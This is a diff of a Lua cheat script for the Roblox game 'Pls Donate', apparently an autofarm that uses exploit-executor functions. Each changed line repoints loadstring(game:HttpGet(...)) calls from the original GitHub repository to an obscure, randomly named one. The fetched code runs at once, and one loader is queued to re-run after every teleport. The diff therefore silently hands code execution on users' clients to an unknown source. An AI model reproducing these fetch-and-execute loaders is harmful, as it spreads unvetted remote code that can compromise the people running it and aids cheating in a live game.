@@ -26,7 +26,7 @@ if isfile and writefile and typeof(isfile) == 'function' and typeof(writefile) =
 	pcall(function()
 		if not isfile('DiscordCFCommunityPDDDWD.txt') then
 			writefile('DiscordCFCommunityPDDDWD.txt', game:GetService('HttpService'):JSONEncode('hi'))
-			local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/DiscordModule"))()
+			local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/ProtoThe/gjosdfgfsdgfsdgfsdgsdgsderthgjrdjghkerthoietjyerkjoer4lkny6te5kjnhjoighertoijhe56jny/main/DiscordModule"))()
 			Module.Prompt({
 				invite = "https://discord.gg/7gVN6ag4",
 				name = "script server", -- update
@@ -252,9 +252,9 @@ local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or 
 local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 local httpservice = game:GetService('HttpService')
 if queueonteleport then
-	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/old.lua'))()")
+	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/ProtoThe/gjosdfgfsdgfsdgfsdgsdgsderthgjrdjghkerthoietjyerkjoer4lkny6te5kjnhjoighertoijhe56jny/main/old.lua'))()")
 end
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/tzechco-PlsDonateAutofarmBackup/main/UI"))()
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ProtoThe/gjosdfgfsdgfsdgfsdgsdgsderthgjrdjghkerthoietjyerkjoer4lkny6te5kjnhjoighertoijhe56jny/main/UI"))()
 function forceServerHop()
 	--local isVip = game:GetService('RobloxReplicatedStorage').GetServerType:InvokeServer()
 	--if isVip == "VIPServer" then return end
